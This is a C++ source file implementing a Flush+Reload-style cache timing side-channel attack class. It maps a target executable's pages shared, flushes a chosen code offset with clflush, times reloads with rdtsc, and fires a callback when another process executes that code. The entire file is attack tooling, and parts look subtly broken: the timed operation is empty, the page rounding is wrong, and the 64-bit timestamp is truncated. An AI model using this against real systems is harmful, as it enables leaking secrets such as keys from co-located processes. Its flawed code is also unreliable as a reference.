#include "cache_timing_attack.hpp"

using CTA = CacheTimingAttack;

struct CTA::impl{

};

void CTA::handle_lambda_calls(std::function<bool (unsigned int n_calls, void* addr)> func, void* addr) const {

	unsigned int n_calls=0;

	do{

		while( !was_accessed(addr) ) n_calls++;

	}while( func(n_calls, addr) );
}

std::tuple<int, size_t> CTA::open_executable(const char* executable) const {

	int fd = open(executable, O_RDONLY);
	size_t size = lseek(fd, 0L, SEEK_END);

	if( !size ) throw std::ios_base::failure("Couldn't open executable");
	return { fd, size };
}


std::tuple<void*, size_t> CTA::mmap_file(int fd, size_t map_size) const {


	unsigned int page_size = sysconf(_SC_PAGE_SIZE);
	if( map_size & page_size ){

		map_size |= page_size;
		map_size++;
	}

	void* base_address = mmap(nullptr, map_size, PROT_READ, MAP_SHARED, fd, 0);

	return { base_address, map_size };
}

bool CTA::was_accessed(void* addr) const {

	bool fast_execution = probe(addr) <= threshold;

	return hit_is_faster ? fast_execution : !fast_execution;
}

void CTA::wait_for_access(void* addr) const {

	while( !was_accessed(addr) );
}

void CTA::call_when_offset_is_accessed(const char* executable, unsigned int offset, std::function<bool (unsigned int n_calls, void* addr)> func) const {

	auto [ fd, size ] = open_executable(executable);

	auto [ base_address, map_size ] = mmap_file(fd, size);

	unsigned int n_calls=0;

	handle_lambda_calls(func, (char*)base_address+offset);
	
	close(fd);
	munmap(base_address, map_size);
}


unsigned int CTA::time() const {

	uint64_t a,d;

	asm volatile(
			"mfence \n"
			"rdtsc \n"
			"mfence \n"
			: "=a"(a), "=d"(d)
			: 
			:
		);

	//rdtsc is a x86 instruction. To write the 64 bit
	//timestamp, it writes the first MSR 32 bits in
	//EDX and the other 32 in EAX.

	return (d<<32) | a;
}

void CTA::flush(void* addr) const {

	asm volatile("clflush (%0)\n"
			:
			: "r"(addr)
			:
		);
}

unsigned int CTA::probe(void* addr) const {

	flush(addr);
	sched_yield(); //move this process to last in processr queue
	return time_operation(addr);
}

unsigned int CTA::time_operation(void* addr) const {

	unsigned int begin = time();
	operation(addr);
	return time() - begin;
}

void CTA::operation(void* addr) const {

}

CTA::CacheTimingAttack() :
	pimpl(std::make_unique<CTA::impl>()){}

CTA::~CacheTimingAttack()=default;

CTA::CacheTimingAttack(const CTA& other) :
	pimpl(std::make_unique<CTA::impl>(*other.pimpl)){

		threshold = other.threshold;
		hit_is_faster = other.hit_is_faster;
	}

CTA& CTA::operator=(const CTA& other) {

	*pimpl = *other.pimpl;

	threshold = other.threshold;
	hit_is_faster = other.hit_is_faster;

	return *this;
}
